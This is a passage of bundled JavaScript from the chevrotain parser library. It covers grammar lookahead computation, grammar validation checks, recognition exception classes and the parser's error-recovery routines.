        const isUnique = isUniquePrefixHash(altsHashes, prefixKeys, altIdx);
        if (isUnique || isEmpty_default(suffixDef) || currPathPrefix.length === k) {
          const currAltResult = finalResult[altIdx];
          if (containsPath(currAltResult, currPathPrefix) === false) {
            currAltResult.push(currPathPrefix);
            for (let j = 0; j < prefixKeys.length; j++) {
              const currKey = prefixKeys[j];
              altsHashes[altIdx][currKey] = true;
            }
          }
        } else {
          const newPartialPathsAndSuffixes = possiblePathsFrom(suffixDef, pathLength + 1, currPathPrefix);
          newData[altIdx] = newData[altIdx].concat(newPartialPathsAndSuffixes);
          forEach_default(newPartialPathsAndSuffixes, (item) => {
            const prefixKeys2 = pathToHashKeys(item.partialPath);
            forEach_default(prefixKeys2, (key) => {
              altsHashes[altIdx][key] = true;
            });
          });
        }
      }
    }
  }
  return finalResult;
}
function getLookaheadPathsForOr(occurrence, ruleGrammar, k, orProd) {
  const visitor = new InsideDefinitionFinderVisitor(occurrence, PROD_TYPE.ALTERNATION, orProd);
  ruleGrammar.accept(visitor);
  return lookAheadSequenceFromAlternatives(visitor.result, k);
}
function getLookaheadPathsForOptionalProd(occurrence, ruleGrammar, prodType, k) {
  const insideDefVisitor = new InsideDefinitionFinderVisitor(occurrence, prodType);
  ruleGrammar.accept(insideDefVisitor);
  const insideDef = insideDefVisitor.result;
  const afterDefWalker = new RestDefinitionFinderWalker(ruleGrammar, occurrence, prodType);
  const afterDef = afterDefWalker.startWalking();
  const insideFlat = new Alternative({ definition: insideDef });
  const afterFlat = new Alternative({ definition: afterDef });
  return lookAheadSequenceFromAlternatives([insideFlat, afterFlat], k);
}
function containsPath(alternative, searchPath) {
  compareOtherPath: for (let i = 0; i < alternative.length; i++) {
    const otherPath = alternative[i];
    if (otherPath.length !== searchPath.length) {
      continue;
    }
    for (let j = 0; j < otherPath.length; j++) {
      const searchTok = searchPath[j];
      const otherTok = otherPath[j];
      const matchingTokens = searchTok === otherTok || otherTok.categoryMatchesMap[searchTok.tokenTypeIdx] !== void 0;
      if (matchingTokens === false) {
        continue compareOtherPath;
      }
    }
    return true;
  }
  return false;
}
function isStrictPrefixOfPath(prefix, other) {
  return prefix.length < other.length && every_default(prefix, (tokType, idx) => {
    const otherTokType = other[idx];
    return tokType === otherTokType || otherTokType.categoryMatchesMap[tokType.tokenTypeIdx];
  });
}
function areTokenCategoriesNotUsed(lookAheadPaths) {
  return every_default(lookAheadPaths, (singleAltPaths) => every_default(singleAltPaths, (singlePath) => every_default(singlePath, (token) => isEmpty_default(token.categoryMatches))));
}
var PROD_TYPE, RestDefinitionFinderWalker, InsideDefinitionFinderVisitor;
var init_lookahead = __esm({
  "node_modules/chevrotain/lib/src/parse/grammar/lookahead.js"() {
    init_lodash();
    init_interpreter();
    init_rest();
    init_tokens();
    init_api2();
    (function(PROD_TYPE2) {
      PROD_TYPE2[PROD_TYPE2["OPTION"] = 0] = "OPTION";
      PROD_TYPE2[PROD_TYPE2["REPETITION"] = 1] = "REPETITION";
      PROD_TYPE2[PROD_TYPE2["REPETITION_MANDATORY"] = 2] = "REPETITION_MANDATORY";
      PROD_TYPE2[PROD_TYPE2["REPETITION_MANDATORY_WITH_SEPARATOR"] = 3] = "REPETITION_MANDATORY_WITH_SEPARATOR";
      PROD_TYPE2[PROD_TYPE2["REPETITION_WITH_SEPARATOR"] = 4] = "REPETITION_WITH_SEPARATOR";
      PROD_TYPE2[PROD_TYPE2["ALTERNATION"] = 5] = "ALTERNATION";
    })(PROD_TYPE || (PROD_TYPE = {}));
    RestDefinitionFinderWalker = class extends RestWalker {
      constructor(topProd, targetOccurrence, targetProdType) {
        super();
        this.topProd = topProd;
        this.targetOccurrence = targetOccurrence;
        this.targetProdType = targetProdType;
      }
      startWalking() {
        this.walk(this.topProd);
        return this.restDef;
      }
      checkIsTarget(node, expectedProdType, currRest, prevRest) {
        if (node.idx === this.targetOccurrence && this.targetProdType === expectedProdType) {
          this.restDef = currRest.concat(prevRest);
          return true;
        }
        return false;
      }
      walkOption(optionProd, currRest, prevRest) {
        if (!this.checkIsTarget(optionProd, PROD_TYPE.OPTION, currRest, prevRest)) {
          super.walkOption(optionProd, currRest, prevRest);
        }
      }
      walkAtLeastOne(atLeastOneProd, currRest, prevRest) {
        if (!this.checkIsTarget(atLeastOneProd, PROD_TYPE.REPETITION_MANDATORY, currRest, prevRest)) {
          super.walkOption(atLeastOneProd, currRest, prevRest);
        }
      }
      walkAtLeastOneSep(atLeastOneSepProd, currRest, prevRest) {
        if (!this.checkIsTarget(atLeastOneSepProd, PROD_TYPE.REPETITION_MANDATORY_WITH_SEPARATOR, currRest, prevRest)) {
          super.walkOption(atLeastOneSepProd, currRest, prevRest);
        }
      }
      walkMany(manyProd, currRest, prevRest) {
        if (!this.checkIsTarget(manyProd, PROD_TYPE.REPETITION, currRest, prevRest)) {
          super.walkOption(manyProd, currRest, prevRest);
        }
      }
      walkManySep(manySepProd, currRest, prevRest) {
        if (!this.checkIsTarget(manySepProd, PROD_TYPE.REPETITION_WITH_SEPARATOR, currRest, prevRest)) {
          super.walkOption(manySepProd, currRest, prevRest);
        }
      }
    };
    InsideDefinitionFinderVisitor = class extends GAstVisitor {
      constructor(targetOccurrence, targetProdType, targetRef) {
        super();
        this.targetOccurrence = targetOccurrence;
        this.targetProdType = targetProdType;
        this.targetRef = targetRef;
        this.result = [];
      }
      checkIsTarget(node, expectedProdName) {
        if (node.idx === this.targetOccurrence && this.targetProdType === expectedProdName && (this.targetRef === void 0 || node === this.targetRef)) {
          this.result = node.definition;
        }
      }
      visitOption(node) {
        this.checkIsTarget(node, PROD_TYPE.OPTION);
      }
      visitRepetition(node) {
        this.checkIsTarget(node, PROD_TYPE.REPETITION);
      }
      visitRepetitionMandatory(node) {
        this.checkIsTarget(node, PROD_TYPE.REPETITION_MANDATORY);
      }
      visitRepetitionMandatoryWithSeparator(node) {
        this.checkIsTarget(node, PROD_TYPE.REPETITION_MANDATORY_WITH_SEPARATOR);
      }
      visitRepetitionWithSeparator(node) {
        this.checkIsTarget(node, PROD_TYPE.REPETITION_WITH_SEPARATOR);
      }
      visitAlternation(node) {
        this.checkIsTarget(node, PROD_TYPE.ALTERNATION);
      }
    };
  }
});

// node_modules/chevrotain/lib/src/parse/grammar/checks.js
function validateLookahead(options) {
  const lookaheadValidationErrorMessages = options.lookaheadStrategy.validate({
    rules: options.rules,
    tokenTypes: options.tokenTypes,
    grammarName: options.grammarName
  });
  return map_default(lookaheadValidationErrorMessages, (errorMessage) => Object.assign({ type: ParserDefinitionErrorType.CUSTOM_LOOKAHEAD_VALIDATION }, errorMessage));
}
function validateGrammar(topLevels, tokenTypes, errMsgProvider, grammarName) {
  const duplicateErrors = flatMap_default(topLevels, (currTopLevel) => validateDuplicateProductions(currTopLevel, errMsgProvider));
  const termsNamespaceConflictErrors = checkTerminalAndNoneTerminalsNameSpace(topLevels, tokenTypes, errMsgProvider);
  const tooManyAltsErrors = flatMap_default(topLevels, (curRule) => validateTooManyAlts(curRule, errMsgProvider));
  const duplicateRulesError = flatMap_default(topLevels, (curRule) => validateRuleDoesNotAlreadyExist(curRule, topLevels, grammarName, errMsgProvider));
  return duplicateErrors.concat(termsNamespaceConflictErrors, tooManyAltsErrors, duplicateRulesError);
}
function validateDuplicateProductions(topLevelRule, errMsgProvider) {
  const collectorVisitor2 = new OccurrenceValidationCollector();
  topLevelRule.accept(collectorVisitor2);
  const allRuleProductions = collectorVisitor2.allProductions;
  const productionGroups = groupBy_default(allRuleProductions, identifyProductionForDuplicates);
  const duplicates = pickBy_default(productionGroups, (currGroup) => {
    return currGroup.length > 1;
  });
  const errors = map_default(values_default(duplicates), (currDuplicates) => {
    const firstProd = head_default(currDuplicates);
    const msg = errMsgProvider.buildDuplicateFoundError(topLevelRule, currDuplicates);
    const dslName = getProductionDslName(firstProd);
    const defError = {
      message: msg,
      type: ParserDefinitionErrorType.DUPLICATE_PRODUCTIONS,
      ruleName: topLevelRule.name,
      dslName,
      occurrence: firstProd.idx
    };
    const param = getExtraProductionArgument(firstProd);
    if (param) {
      defError.parameter = param;
    }
    return defError;
  });
  return errors;
}
function identifyProductionForDuplicates(prod) {
  return `${getProductionDslName(prod)}_#_${prod.idx}_#_${getExtraProductionArgument(prod)}`;
}
function getExtraProductionArgument(prod) {
  if (prod instanceof Terminal) {
    return prod.terminalType.name;
  } else if (prod instanceof NonTerminal) {
    return prod.nonTerminalName;
  } else {
    return "";
  }
}
function validateRuleDoesNotAlreadyExist(rule, allRules, className, errMsgProvider) {
  const errors = [];
  const occurrences = reduce_default(allRules, (result, curRule) => {
    if (curRule.name === rule.name) {
      return result + 1;
    }
    return result;
  }, 0);
  if (occurrences > 1) {
    const errMsg = errMsgProvider.buildDuplicateRuleNameError({
      topLevelRule: rule,
      grammarName: className
    });
    errors.push({
      message: errMsg,
      type: ParserDefinitionErrorType.DUPLICATE_RULE_NAME,
      ruleName: rule.name
    });
  }
  return errors;
}
function validateRuleIsOverridden(ruleName, definedRulesNames, className) {
  const errors = [];
  let errMsg;
  if (!includes_default(definedRulesNames, ruleName)) {
    errMsg = `Invalid rule override, rule: ->${ruleName}<- cannot be overridden in the grammar: ->${className}<-as it is not defined in any of the super grammars `;
    errors.push({
      message: errMsg,
      type: ParserDefinitionErrorType.INVALID_RULE_OVERRIDE,
      ruleName
    });
  }
  return errors;
}
function validateNoLeftRecursion(topRule, currRule, errMsgProvider, path2 = []) {
  const errors = [];
  const nextNonTerminals = getFirstNoneTerminal(currRule.definition);
  if (isEmpty_default(nextNonTerminals)) {
    return [];
  } else {
    const ruleName = topRule.name;
    const foundLeftRecursion = includes_default(nextNonTerminals, topRule);
    if (foundLeftRecursion) {
      errors.push({
        message: errMsgProvider.buildLeftRecursionError({
          topLevelRule: topRule,
          leftRecursionPath: path2
        }),
        type: ParserDefinitionErrorType.LEFT_RECURSION,
        ruleName
      });
    }
    const validNextSteps = difference_default(nextNonTerminals, path2.concat([topRule]));
    const errorsFromNextSteps = flatMap_default(validNextSteps, (currRefRule) => {
      const newPath = clone_default(path2);
      newPath.push(currRefRule);
      return validateNoLeftRecursion(topRule, currRefRule, errMsgProvider, newPath);
    });
    return errors.concat(errorsFromNextSteps);
  }
}
function getFirstNoneTerminal(definition) {
  let result = [];
  if (isEmpty_default(definition)) {
    return result;
  }
  const firstProd = head_default(definition);
  if (firstProd instanceof NonTerminal) {
    result.push(firstProd.referencedRule);
  } else if (firstProd instanceof Alternative || firstProd instanceof Option || firstProd instanceof RepetitionMandatory || firstProd instanceof RepetitionMandatoryWithSeparator || firstProd instanceof RepetitionWithSeparator || firstProd instanceof Repetition) {
    result = result.concat(getFirstNoneTerminal(firstProd.definition));
  } else if (firstProd instanceof Alternation) {
    result = flatten_default(map_default(firstProd.definition, (currSubDef) => getFirstNoneTerminal(currSubDef.definition)));
  } else if (firstProd instanceof Terminal) {
  } else {
    throw Error("non exhaustive match");
  }
  const isFirstOptional = isOptionalProd(firstProd);
  const hasMore = definition.length > 1;
  if (isFirstOptional && hasMore) {
    const rest = drop_default(definition);
    return result.concat(getFirstNoneTerminal(rest));
  } else {
    return result;
  }
}
function validateEmptyOrAlternative(topLevelRule, errMsgProvider) {
  const orCollector = new OrCollector();
  topLevelRule.accept(orCollector);
  const ors = orCollector.alternations;
  const errors = flatMap_default(ors, (currOr) => {
    const exceptLast = dropRight_default(currOr.definition);
    return flatMap_default(exceptLast, (currAlternative, currAltIdx) => {
      const possibleFirstInAlt = nextPossibleTokensAfter([currAlternative], [], tokenStructuredMatcher, 1);
      if (isEmpty_default(possibleFirstInAlt)) {
        return [
          {
            message: errMsgProvider.buildEmptyAlternationError({
              topLevelRule,
              alternation: currOr,
              emptyChoiceIdx: currAltIdx
            }),
            type: ParserDefinitionErrorType.NONE_LAST_EMPTY_ALT,
            ruleName: topLevelRule.name,
            occurrence: currOr.idx,
            alternative: currAltIdx + 1
          }
        ];
      } else {
        return [];
      }
    });
  });
  return errors;
}
function validateAmbiguousAlternationAlternatives(topLevelRule, globalMaxLookahead, errMsgProvider) {
  const orCollector = new OrCollector();
  topLevelRule.accept(orCollector);
  let ors = orCollector.alternations;
  ors = reject_default(ors, (currOr) => currOr.ignoreAmbiguities === true);
  const errors = flatMap_default(ors, (currOr) => {
    const currOccurrence = currOr.idx;
    const actualMaxLookahead = currOr.maxLookahead || globalMaxLookahead;
    const alternatives = getLookaheadPathsForOr(currOccurrence, topLevelRule, actualMaxLookahead, currOr);
    const altsAmbiguityErrors = checkAlternativesAmbiguities(alternatives, currOr, topLevelRule, errMsgProvider);
    const altsPrefixAmbiguityErrors = checkPrefixAlternativesAmbiguities(alternatives, currOr, topLevelRule, errMsgProvider);
    return altsAmbiguityErrors.concat(altsPrefixAmbiguityErrors);
  });
  return errors;
}
function validateTooManyAlts(topLevelRule, errMsgProvider) {
  const orCollector = new OrCollector();
  topLevelRule.accept(orCollector);
  const ors = orCollector.alternations;
  const errors = flatMap_default(ors, (currOr) => {
    if (currOr.definition.length > 255) {
      return [
        {
          message: errMsgProvider.buildTooManyAlternativesError({
            topLevelRule,
            alternation: currOr
          }),
          type: ParserDefinitionErrorType.TOO_MANY_ALTS,
          ruleName: topLevelRule.name,
          occurrence: currOr.idx
        }
      ];
    } else {
      return [];
    }
  });
  return errors;
}
function validateSomeNonEmptyLookaheadPath(topLevelRules, maxLookahead, errMsgProvider) {
  const errors = [];
  forEach_default(topLevelRules, (currTopRule) => {
    const collectorVisitor2 = new RepetitionCollector();
    currTopRule.accept(collectorVisitor2);
    const allRuleProductions = collectorVisitor2.allProductions;
    forEach_default(allRuleProductions, (currProd) => {
      const prodType = getProdType(currProd);
      const actualMaxLookahead = currProd.maxLookahead || maxLookahead;
      const currOccurrence = currProd.idx;
      const paths = getLookaheadPathsForOptionalProd(currOccurrence, currTopRule, prodType, actualMaxLookahead);
      const pathsInsideProduction = paths[0];
      if (isEmpty_default(flatten_default(pathsInsideProduction))) {
        const errMsg = errMsgProvider.buildEmptyRepetitionError({
          topLevelRule: currTopRule,
          repetition: currProd
        });
        errors.push({
          message: errMsg,
          type: ParserDefinitionErrorType.NO_NON_EMPTY_LOOKAHEAD,
          ruleName: currTopRule.name
        });
      }
    });
  });
  return errors;
}
function checkAlternativesAmbiguities(alternatives, alternation, rule, errMsgProvider) {
  const foundAmbiguousPaths = [];
  const identicalAmbiguities = reduce_default(alternatives, (result, currAlt, currAltIdx) => {
    if (alternation.definition[currAltIdx].ignoreAmbiguities === true) {
      return result;
    }
    forEach_default(currAlt, (currPath) => {
      const altsCurrPathAppearsIn = [currAltIdx];
      forEach_default(alternatives, (currOtherAlt, currOtherAltIdx) => {
        if (currAltIdx !== currOtherAltIdx && containsPath(currOtherAlt, currPath) && // ignore (skip) ambiguities with this "other" alternative
        alternation.definition[currOtherAltIdx].ignoreAmbiguities !== true) {
          altsCurrPathAppearsIn.push(currOtherAltIdx);
        }
      });
      if (altsCurrPathAppearsIn.length > 1 && !containsPath(foundAmbiguousPaths, currPath)) {
        foundAmbiguousPaths.push(currPath);
        result.push({
          alts: altsCurrPathAppearsIn,
          path: currPath
        });
      }
    });
    return result;
  }, []);
  const currErrors = map_default(identicalAmbiguities, (currAmbDescriptor) => {
    const ambgIndices = map_default(currAmbDescriptor.alts, (currAltIdx) => currAltIdx + 1);
    const currMessage = errMsgProvider.buildAlternationAmbiguityError({
      topLevelRule: rule,
      alternation,
      ambiguityIndices: ambgIndices,
      prefixPath: currAmbDescriptor.path
    });
    return {
      message: currMessage,
      type: ParserDefinitionErrorType.AMBIGUOUS_ALTS,
      ruleName: rule.name,
      occurrence: alternation.idx,
      alternatives: currAmbDescriptor.alts
    };
  });
  return currErrors;
}
function checkPrefixAlternativesAmbiguities(alternatives, alternation, rule, errMsgProvider) {
  const pathsAndIndices = reduce_default(alternatives, (result, currAlt, idx) => {
    const currPathsAndIdx = map_default(currAlt, (currPath) => {
      return { idx, path: currPath };
    });
    return result.concat(currPathsAndIdx);
  }, []);
  const errors = compact_default(flatMap_default(pathsAndIndices, (currPathAndIdx) => {
    const alternativeGast = alternation.definition[currPathAndIdx.idx];
    if (alternativeGast.ignoreAmbiguities === true) {
      return [];
    }
    const targetIdx = currPathAndIdx.idx;
    const targetPath = currPathAndIdx.path;
    const prefixAmbiguitiesPathsAndIndices = filter_default(pathsAndIndices, (searchPathAndIdx) => {
      return (
        // ignore (skip) ambiguities with this "other" alternative
        alternation.definition[searchPathAndIdx.idx].ignoreAmbiguities !== true && searchPathAndIdx.idx < targetIdx && // checking for strict prefix because identical lookaheads
        // will be be detected using a different validation.
        isStrictPrefixOfPath(searchPathAndIdx.path, targetPath)
      );
    });
    const currPathPrefixErrors = map_default(prefixAmbiguitiesPathsAndIndices, (currAmbPathAndIdx) => {
      const ambgIndices = [currAmbPathAndIdx.idx + 1, targetIdx + 1];
      const occurrence = alternation.idx === 0 ? "" : alternation.idx;
      const message = errMsgProvider.buildAlternationPrefixAmbiguityError({
        topLevelRule: rule,
        alternation,
        ambiguityIndices: ambgIndices,
        prefixPath: currAmbPathAndIdx.path
      });
      return {
        message,
        type: ParserDefinitionErrorType.AMBIGUOUS_PREFIX_ALTS,
        ruleName: rule.name,
        occurrence,
        alternatives: ambgIndices
      };
    });
    return currPathPrefixErrors;
  }));
  return errors;
}
function checkTerminalAndNoneTerminalsNameSpace(topLevels, tokenTypes, errMsgProvider) {
  const errors = [];
  const tokenNames = map_default(tokenTypes, (currToken) => currToken.name);
  forEach_default(topLevels, (currRule) => {
    const currRuleName = currRule.name;
    if (includes_default(tokenNames, currRuleName)) {
      const errMsg = errMsgProvider.buildNamespaceConflictError(currRule);
      errors.push({
        message: errMsg,
        type: ParserDefinitionErrorType.CONFLICT_TOKENS_RULES_NAMESPACE,
        ruleName: currRuleName
      });
    }
  });
  return errors;
}
var OccurrenceValidationCollector, OrCollector, RepetitionCollector;
var init_checks = __esm({
  "node_modules/chevrotain/lib/src/parse/grammar/checks.js"() {
    init_lodash();
    init_parser();
    init_api2();
    init_lookahead();
    init_interpreter();
    init_tokens();
    OccurrenceValidationCollector = class extends GAstVisitor {
      constructor() {
        super(...arguments);
        this.allProductions = [];
      }
      visitNonTerminal(subrule) {
        this.allProductions.push(subrule);
      }
      visitOption(option) {
        this.allProductions.push(option);
      }
      visitRepetitionWithSeparator(manySep) {
        this.allProductions.push(manySep);
      }
      visitRepetitionMandatory(atLeastOne) {
        this.allProductions.push(atLeastOne);
      }
      visitRepetitionMandatoryWithSeparator(atLeastOneSep) {
        this.allProductions.push(atLeastOneSep);
      }
      visitRepetition(many) {
        this.allProductions.push(many);
      }
      visitAlternation(or) {
        this.allProductions.push(or);
      }
      visitTerminal(terminal) {
        this.allProductions.push(terminal);
      }
    };
    OrCollector = class extends GAstVisitor {
      constructor() {
        super(...arguments);
        this.alternations = [];
      }
      visitAlternation(node) {
        this.alternations.push(node);
      }
    };
    RepetitionCollector = class extends GAstVisitor {
      constructor() {
        super(...arguments);
        this.allProductions = [];
      }
      visitRepetitionWithSeparator(manySep) {
        this.allProductions.push(manySep);
      }
      visitRepetitionMandatory(atLeastOne) {
        this.allProductions.push(atLeastOne);
      }
      visitRepetitionMandatoryWithSeparator(atLeastOneSep) {
        this.allProductions.push(atLeastOneSep);
      }
      visitRepetition(many) {
        this.allProductions.push(many);
      }
    };
  }
});

// node_modules/chevrotain/lib/src/parse/grammar/gast/gast_resolver_public.js
function resolveGrammar2(options) {
  const actualOptions = defaults_default(options, {
    errMsgProvider: defaultGrammarResolverErrorProvider
  });
  const topRulesTable = {};
  forEach_default(options.rules, (rule) => {
    topRulesTable[rule.name] = rule;
  });
  return resolveGrammar(topRulesTable, actualOptions.errMsgProvider);
}
function validateGrammar2(options) {
  options = defaults_default(options, {
    errMsgProvider: defaultGrammarValidatorErrorProvider
  });
  return validateGrammar(options.rules, options.tokenTypes, options.errMsgProvider, options.grammarName);
}
var init_gast_resolver_public = __esm({
  "node_modules/chevrotain/lib/src/parse/grammar/gast/gast_resolver_public.js"() {
    init_lodash();
    init_resolver();
    init_checks();
    init_errors_public();
  }
});

// node_modules/chevrotain/lib/src/parse/exceptions_public.js
function isRecognitionException(error) {
  return includes_default(RECOGNITION_EXCEPTION_NAMES, error.name);
}
var MISMATCHED_TOKEN_EXCEPTION, NO_VIABLE_ALT_EXCEPTION, EARLY_EXIT_EXCEPTION, NOT_ALL_INPUT_PARSED_EXCEPTION, RECOGNITION_EXCEPTION_NAMES, RecognitionException, MismatchedTokenException, NoViableAltException, NotAllInputParsedException, EarlyExitException;
var init_exceptions_public = __esm({
  "node_modules/chevrotain/lib/src/parse/exceptions_public.js"() {
    init_lodash();
    MISMATCHED_TOKEN_EXCEPTION = "MismatchedTokenException";
    NO_VIABLE_ALT_EXCEPTION = "NoViableAltException";
    EARLY_EXIT_EXCEPTION = "EarlyExitException";
    NOT_ALL_INPUT_PARSED_EXCEPTION = "NotAllInputParsedException";
    RECOGNITION_EXCEPTION_NAMES = [
      MISMATCHED_TOKEN_EXCEPTION,
      NO_VIABLE_ALT_EXCEPTION,
      EARLY_EXIT_EXCEPTION,
      NOT_ALL_INPUT_PARSED_EXCEPTION
    ];
    Object.freeze(RECOGNITION_EXCEPTION_NAMES);
    RecognitionException = class extends Error {
      constructor(message, token) {
        super(message);
        this.token = token;
        this.resyncedTokens = [];
        Object.setPrototypeOf(this, new.target.prototype);
        if (Error.captureStackTrace) {
          Error.captureStackTrace(this, this.constructor);
        }
      }
    };
    MismatchedTokenException = class extends RecognitionException {
      constructor(message, token, previousToken) {
        super(message, token);
        this.previousToken = previousToken;
        this.name = MISMATCHED_TOKEN_EXCEPTION;
      }
    };
    NoViableAltException = class extends RecognitionException {
      constructor(message, token, previousToken) {
        super(message, token);
        this.previousToken = previousToken;
        this.name = NO_VIABLE_ALT_EXCEPTION;
      }
    };
    NotAllInputParsedException = class extends RecognitionException {
      constructor(message, token) {
        super(message, token);
        this.name = NOT_ALL_INPUT_PARSED_EXCEPTION;
      }
    };
    EarlyExitException = class extends RecognitionException {
      constructor(message, token, previousToken) {
        super(message, token);
        this.previousToken = previousToken;
        this.name = EARLY_EXIT_EXCEPTION;
      }
    };
  }
});

// node_modules/chevrotain/lib/src/parse/parser/traits/recoverable.js
function attemptInRepetitionRecovery(prodFunc, args2, lookaheadFunc, dslMethodIdx, prodOccurrence, nextToksWalker, notStuck) {
  const key = this.getKeyForAutomaticLookahead(dslMethodIdx, prodOccurrence);
  let firstAfterRepInfo = this.firstAfterRepMap[key];
  if (firstAfterRepInfo === void 0) {
    const currRuleName = this.getCurrRuleFullName();
    const ruleGrammar = this.getGAstProductions()[currRuleName];
    const walker = new nextToksWalker(ruleGrammar, prodOccurrence);
    firstAfterRepInfo = walker.startWalking();
    this.firstAfterRepMap[key] = firstAfterRepInfo;
  }
  let expectTokAfterLastMatch = firstAfterRepInfo.token;
  let nextTokIdx = firstAfterRepInfo.occurrence;
  const isEndOfRule = firstAfterRepInfo.isEndOfRule;
  if (this.RULE_STACK.length === 1 && isEndOfRule && expectTokAfterLastMatch === void 0) {
    expectTokAfterLastMatch = EOF;
    nextTokIdx = 1;
  }
  if (expectTokAfterLastMatch === void 0 || nextTokIdx === void 0) {
    return;
  }
  if (this.shouldInRepetitionRecoveryBeTried(expectTokAfterLastMatch, nextTokIdx, notStuck)) {
    this.tryInRepetitionRecovery(prodFunc, args2, lookaheadFunc, expectTokAfterLastMatch);
  }
}
var EOF_FOLLOW_KEY, IN_RULE_RECOVERY_EXCEPTION, InRuleRecoveryException, Recoverable;
var init_recoverable = __esm({
  "node_modules/chevrotain/lib/src/parse/parser/traits/recoverable.js"() {
    init_tokens_public();
    init_lodash();
    init_exceptions_public();
    init_constants();
    init_parser();
    EOF_FOLLOW_KEY = {};
    IN_RULE_RECOVERY_EXCEPTION = "InRuleRecoveryException";
    InRuleRecoveryException = class extends Error {
      constructor(message) {
        super(message);
        this.name = IN_RULE_RECOVERY_EXCEPTION;
      }
    };
    Recoverable = class {
      initRecoverable(config) {
        this.firstAfterRepMap = {};
        this.resyncFollows = {};
        this.recoveryEnabled = has_default(config, "recoveryEnabled") ? config.recoveryEnabled : DEFAULT_PARSER_CONFIG.recoveryEnabled;
        if (this.recoveryEnabled) {
          this.attemptInRepetitionRecovery = attemptInRepetitionRecovery;
        }
      }
      getTokenToInsert(tokType) {
        const tokToInsert = createTokenInstance(tokType, "", NaN, NaN, NaN, NaN, NaN, NaN);
        tokToInsert.isInsertedInRecovery = true;
        return tokToInsert;
      }
      canTokenTypeBeInsertedInRecovery(tokType) {
        return true;
      }
      canTokenTypeBeDeletedInRecovery(tokType) {
        return true;
      }
      tryInRepetitionRecovery(grammarRule, grammarRuleArgs, lookAheadFunc, expectedTokType) {
        const reSyncTokType = this.findReSyncTokenType();
        const savedLexerState = this.exportLexerState();
        const resyncedTokens = [];
        let passedResyncPoint = false;
        const nextTokenWithoutResync = this.LA(1);
        let currToken = this.LA(1);
        const generateErrorMessage = () => {
          const previousToken = this.LA(0);
          const msg = this.errorMessageProvider.buildMismatchTokenMessage({
            expected: expectedTokType,
            actual: nextTokenWithoutResync,
            previous: previousToken,
            ruleName: this.getCurrRuleFullName()
          });
          const error = new MismatchedTokenException(msg, nextTokenWithoutResync, this.LA(0));
          error.resyncedTokens = dropRight_default(resyncedTokens);
          this.SAVE_ERROR(error);
        };
        while (!passedResyncPoint) {
          if (this.tokenMatcher(currToken, expectedTokType)) {
            generateErrorMessage();
            return;
          } else if (lookAheadFunc.call(this)) {
            generateErrorMessage();
            grammarRule.apply(this, grammarRuleArgs);
            return;
          } else if (this.tokenMatcher(currToken, reSyncTokType)) {
            passedResyncPoint = true;
          } else {
            currToken = this.SKIP_TOKEN();
            this.addToResyncTokens(currToken, resyncedTokens);
          }
        }
        this.importLexerState(savedLexerState);
      }
      shouldInRepetitionRecoveryBeTried(expectTokAfterLastMatch, nextTokIdx, notStuck) {
        if (notStuck === false) {
          return false;
        }
        if (this.tokenMatcher(this.LA(1), expectTokAfterLastMatch)) {
          return false;
        }
        if (this.isBackTracking()) {
          return false;
        }
        if (this.canPerformInRuleRecovery(expectTokAfterLastMatch, this.getFollowsForInRuleRecovery(expectTokAfterLastMatch, nextTokIdx))) {
          return false;
        }
        return true;
      }
      // Error Recovery functionality
      getFollowsForInRuleRecovery(tokType, tokIdxInRule) {
        const grammarPath = this.getCurrentGrammarPath(tokType, tokIdxInRule);
        const follows = this.getNextPossibleTokenTypes(grammarPath);
        return follows;
      }
      tryInRuleRecovery(expectedTokType, follows) {
        if (this.canRecoverWithSingleTokenInsertion(expectedTokType, follows)) {
          const tokToInsert = this.getTokenToInsert(expectedTokType);
          return tokToInsert;
        }
        if (this.canRecoverWithSingleTokenDeletion(expectedTokType)) {
          const nextTok = this.SKIP_TOKEN();
          this.consumeToken();
          return nextTok;
        }
        throw new InRuleRecoveryException("sad sad panda");
      }
      canPerformInRuleRecovery(expectedToken, follows) {
        return this.canRecoverWithSingleTokenInsertion(expectedToken, follows) || this.canRecoverWithSingleTokenDeletion(expectedToken);
      }
      canRecoverWithSingleTokenInsertion(expectedTokType, follows) {
        if (!this.canTokenTypeBeInsertedInRecovery(expectedTokType)) {
          return false;
        }
        if (isEmpty_default(follows)) {
          return false;
        }
        const mismatchedTok = this.LA(1);
        const isMisMatchedTokInFollows = find_default(follows, (possibleFollowsTokType) => {
          return this.tokenMatcher(mismatchedTok, possibleFollowsTokType);
        }) !== void 0;
        return isMisMatchedTokInFollows;
      }
      canRecoverWithSingleTokenDeletion(expectedTokType) {
        if (!this.canTokenTypeBeDeletedInRecovery(expectedTokType)) {
          return false;
        }
        const isNextTokenWhatIsExpected = this.tokenMatcher(this.LA(2), expectedTokType);
        return isNextTokenWhatIsExpected;
      }
      isInCurrentRuleReSyncSet(tokenTypeIdx) {
        const followKey = this.getCurrFollowKey();
        const currentRuleReSyncSet = this.getFollowSetFromFollowKey(followKey);
        return includes_default(currentRuleReSyncSet, tokenTypeIdx);
      }
      findReSyncTokenType() {
        const allPossibleReSyncTokTypes = this.flattenFollowSet();
        let nextToken = this.LA(1);
        let k = 2;
        while (true) {
          const foundMatch = find_default(allPossibleReSyncTokTypes, (resyncTokType) => {
            const canMatch = tokenMatcher(nextToken, resyncTokType);
            return canMatch;
          });
          if (foundMatch !== void 0) {
            return foundMatch;
          }
          nextToken = this.LA(k);
          k++;
        }
      }
      getCurrFollowKey() {
        if (this.RULE_STACK.length === 1) {
          return EOF_FOLLOW_KEY;
        }
        const currRuleShortName = this.getLastExplicitRuleShortName();
        const currRuleIdx = this.getLastExplicitRuleOccurrenceIndex();
        const prevRuleShortName = this.getPreviousExplicitRuleShortName();
        return {
          ruleName: this.shortRuleNameToFullName(currRuleShortName),
          idxInCallingRule: currRuleIdx,
          inRule: this.shortRuleNameToFullName(prevRuleShortName)
        };
      }
      buildFullFollowKeyStack() {
        const explicitRuleStack = this.RULE_STACK;
        const explicitOccurrenceStack = this.RULE_OCCURRENCE_STACK;
        return map_default(explicitRuleStack, (ruleName, idx) => {
          if (idx === 0) {
            return EOF_FOLLOW_KEY;
          }
          return {
            ruleName: this.shortRuleNameToFullName(ruleName),
            idxInCallingRule: explicitOccurrenceStack[idx],
            inRule: this.shortRuleNameToFullName(explicitRuleStack[idx - 1])
          };
        });
      }
      flattenFollowSet() {
        const followStack = map_default(this.buildFullFollowKeyStack(), (currKey) => {
          return this.getFollowSetFromFollowKey(currKey);
        });
        return flatten_default(followStack);
      }
      getFollowSetFromFollowKey(followKey) {
        if (followKey === EOF_FOLLOW_KEY) {
          return [EOF];
        }
        const followName = followKey.ruleName + followKey.idxInCallingRule + IN + followKey.inRule;
        return this.resyncFollows[followName];
      }
